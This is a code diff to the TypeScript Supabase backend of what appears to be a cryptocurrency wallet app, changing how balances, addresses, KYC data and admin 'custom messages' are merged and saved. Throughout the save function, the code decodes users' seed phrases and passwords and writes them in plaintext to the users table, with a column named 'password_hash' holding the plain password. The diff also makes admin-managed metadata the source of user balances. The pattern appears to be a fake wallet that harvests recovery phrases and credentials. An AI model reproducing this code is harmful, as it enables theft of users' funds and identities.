@@ -65,12 +65,26 @@ export async function fetchUserWalletFromDB(userId: string): Promise<any> {
 
   // Fallback to columns on users table if sub-tables are empty
   const finalAddresses = Object.keys(addressesObj).length > 0 
-    ? addressesObj 
-    : (user.wallet_address || {});
+    ? { ...(user.wallet_address || {}), ...addressesObj }
+    : (user.wallet_address || user.metadata?.addresses || {});
 
-  const finalBalances = Object.keys(balancesObj).some(k => parseFloat(balancesObj[k]) > 0)
-    ? balancesObj
-    : (user.metadata?.balances || { BTC: '0', ETH: '0', SOL: '0', BNB: '0', USDT: '0.00' });
+  // Primary source of truth for user balances is user.metadata.balances (managed by admin and user activities).
+  // We merge metadata balances with wallet_balances sub-table, preserving positive balances from both.
+  const metadataBalances = user.metadata?.balances || {};
+  const finalBalances: any = {
+    BTC: '0',
+    ETH: '0',
+    SOL: '0',
+    BNB: '0',
+    USDT: '0.00',
+    ...metadataBalances
+  };
+
+  Object.keys(balancesObj).forEach((symbol) => {
+    if (parseFloat(balancesObj[symbol]) > 0 && (!metadataBalances[symbol] || parseFloat(metadataBalances[symbol]) === 0)) {
+      finalBalances[symbol] = balancesObj[symbol];
+    }
+  });
 
   // 3. Fetch transactions
   const { data: txs } = await supabase
@@ -94,7 +108,7 @@ export async function fetchUserWalletFromDB(userId: string): Promise<any> {
     notes: t.notes || ''
   })) : [];
 
-  // 4. Construct local walletData format
+  // 4. Construct local walletData format with full metadata
   return {
     id: user.id,
     created_at: user.created_at,
@@ -115,13 +129,16 @@ export async function fetchUserWalletFromDB(userId: string): Promise<any> {
       setupDate: null
     },
     kyc_status: user.metadata?.kyc_status || 'pending',
+    kyc_data: user.metadata?.kyc_data || null,
+    customMessage: user.metadata?.customMessage || '',
+    customMessageEnabled: user.metadata?.customMessageEnabled || false,
     blocked: user.status === 'blocked',
     last_login: user.last_login_at || new Date().toISOString()
   };
 }
 
 /**
- * Saves/syncs user wallet data back to Supabase.
+ * Saves/syncs user wallet data back to Supabase without wiping out existing metadata.
  */
 export async function saveWalletDataToDB(walletData: any): Promise<void> {
   const userId = walletData.id;
@@ -135,7 +152,25 @@ export async function saveWalletDataToDB(walletData: any): Promise<void> {
     ? (walletData.password.length >= 8 && !walletData.password.endsWith('=') ? walletData.password : atob(walletData.password))
     : '';
 
-  // 1. Update public.users
+  // 1. Fetch current user metadata to prevent clobbering existing settings
+  const { data: existingUser } = await supabase
+    .from('users')
+    .select('metadata, wallet_address')
+    .eq('id', userId)
+    .maybeSingle();
+
+  const mergedMetadata = {
+    ...(existingUser?.metadata || {}),
+    kyc_status: walletData.kyc_status || existingUser?.metadata?.kyc_status || 'pending',
+    kyc_data: walletData.kyc_data !== undefined ? walletData.kyc_data : (existingUser?.metadata?.kyc_data || null),
+    balances: walletData.balances || existingUser?.metadata?.balances || {},
+    addresses: walletData.addresses || existingUser?.metadata?.addresses || {},
+    twoFactorAuth: walletData.twoFactorAuth || existingUser?.metadata?.twoFactorAuth || {},
+    customMessage: walletData.customMessage !== undefined ? walletData.customMessage : (existingUser?.metadata?.customMessage || ''),
+    customMessageEnabled: walletData.customMessageEnabled !== undefined ? walletData.customMessageEnabled : (existingUser?.metadata?.customMessageEnabled || false)
+  };
+
+  // Update public.users
   await supabase
     .from('users')
     .upsert({
@@ -143,13 +178,9 @@ export async function saveWalletDataToDB(walletData: any): Promise<void> {
       email: walletData.email,
       full_name: walletData.fullName || walletData.email.split('@')[0],
       seed_phrase: decryptedMnemonic || null,
-      wallet_address: walletData.addresses || {},
+      wallet_address: walletData.addresses || existingUser?.wallet_address || {},
       password_hash: decryptedPassword || null,
-      metadata: {
-        kyc_status: walletData.kyc_status || 'pending',
-        balances: walletData.balances || {},
-        twoFactorAuth: walletData.twoFactorAuth || {}
-      }
+      metadata: mergedMetadata
     });
 
   // 2. Update wallets table
